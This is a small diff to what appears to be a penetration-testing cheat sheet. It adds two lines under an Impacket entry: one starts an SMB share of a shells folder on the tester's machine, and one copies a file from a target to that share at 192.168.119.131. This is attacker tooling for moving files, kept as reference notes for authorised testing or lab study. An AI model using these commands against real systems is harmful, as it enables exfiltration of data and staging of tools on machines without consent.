@@ -489,6 +489,8 @@ Report Template
 Network Tools
 
     Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket
+      host:impacket-smbserver pkong /root/shells
+      target: copy .\file \\192.168.119.131\pkong\file
 
 File Transfers
 
